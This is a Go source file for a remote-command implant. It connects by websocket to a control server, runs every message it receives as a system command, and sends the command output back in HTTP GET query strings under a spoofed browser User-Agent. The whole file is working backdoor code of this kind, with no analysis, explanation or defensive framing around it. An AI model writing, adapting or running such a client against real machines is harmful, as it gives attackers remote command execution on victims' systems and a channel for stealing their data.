package main

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	socketUrl = "ws://0.0.0.0:443" + "/"
	webUrl    = "http://0.0.0.0:443" + "/control"

	receive = make(chan string)
	send    = make(chan string)
	done    = make(chan struct{})

	// colors
	green = color.Green
	red   = color.Red
	bold  = color.New(color.Bold).SprintFunc()
)

func main() {
	//interrupt := make(chan os.Signal, 1)
	//signal.Notify(interrupt, os.Interrupt)

	time.Sleep(1 * time.Second)
	// connect to server
	conn, _, err := websocket.DefaultDialer.Dial(socketUrl, nil)
	if err != nil {
		red(bold("Error: " + err.Error()))
		os.Exit(1)
	}
	defer conn.Close()

	//// create channel for messages
	//go func() {
	//	commands := []string{"Here we go!"}
	//	for _, command := range commands {
	//		send <- command
	//		time.Sleep(2 * time.Second)
	//	}
	//}()

	go receiveMessage(conn)

	for {
		select {
		case this := <-send:
			sendMessage(conn, this)
		case this := <-receive:
			log.Printf("recv: %s", this)
			stdout := execute(this)
			get(webUrl, stdout)
			//sendMessage(conn, stdout)
		case <-done:
			//interrupt(conn)
			return
		}
	}

}

// function to sendMessage to server
func sendMessage(conn *websocket.Conn, message string) {
	// send message to server
	err := conn.WriteMessage(websocket.TextMessage, []byte(message))
	if err != nil {
		red(bold("Error: " + err.Error()))
		return
	}
}

// function to receiveMessage from server
func receiveMessage(conn *websocket.Conn) {
	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			red(bold("Error: " + err.Error()))
			return
		}
		receive <- string(message)
	}
}

// function to execute command
func execute(command string) string {
	// split command into args by space exclude first arg
	args := strings.Split(command, " ")[1:]

	out, err := exec.Command(strings.Split(command, " ")[0], args...).Output()
	if err != nil {
		fmt.Printf("%s", err)
	}

	//fmt.Println("Command Successfully Executed")
	return string(out[:])
}

// function interrupt connection
func interrupt(conn *websocket.Conn) error {
	log.Println("interrupt")
	err := conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	if err != nil {
		return err
	}
	return nil
}

// function send get request with string data
func get(url string, data string) {
	// create client
	client := &http.Client{}

	// create request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		red(bold("Error: " + err.Error()))
	}

	// add data to query
	q := req.URL.Query()
	q.Add("out", data)
	req.URL.RawQuery = q.Encode()

	// set header
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")

	// send request
	resp, err := client.Do(req)
	if err != nil {
		red(bold("Error: " + err.Error()))
	}

	// check if response is 200 OK
	if resp.StatusCode == http.StatusOK {
		green(bold("Success: " + resp.Status))
	}
}
